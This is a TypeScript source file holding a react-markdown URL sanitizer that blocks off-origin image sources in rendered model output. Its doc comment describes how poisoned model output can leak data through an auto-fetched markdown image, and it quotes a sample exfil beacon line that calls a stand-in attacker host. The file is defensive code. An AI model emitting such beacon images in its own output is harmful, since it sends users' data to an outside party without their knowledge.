import { defaultUrlTransform } from 'react-markdown';

/**
 * Restrict markdown image sources to same-origin or relative URLs.
 *
 * Kiki renders model output as markdown, and react-markdown renders markdown
 * images. Poisoned model output could emit `![](http://attacker/?leak=...)`,
 * which the browser auto-fetches — an exfil beacon. Blocking external image
 * hosts here neutralizes that in every environment (the production CSP is a
 * second layer, but the dev server ships none). Link (`href`) URLs keep only
 * react-markdown's default sanitization, so users can still follow real links.
 * (react-markdown's default transform already strips `data:` and unsafe
 * protocols, so those never reach the same-origin check below.)
 */
export function safeMarkdownUrl(url: string, key: string): string {
  const sanitized = defaultUrlTransform(url);
  if (key !== 'src' || !sanitized) return sanitized;
  try {
    const resolved = new URL(sanitized, window.location.origin);
    return resolved.origin === window.location.origin ? sanitized : '';
  } catch {
    return '';
  }
}
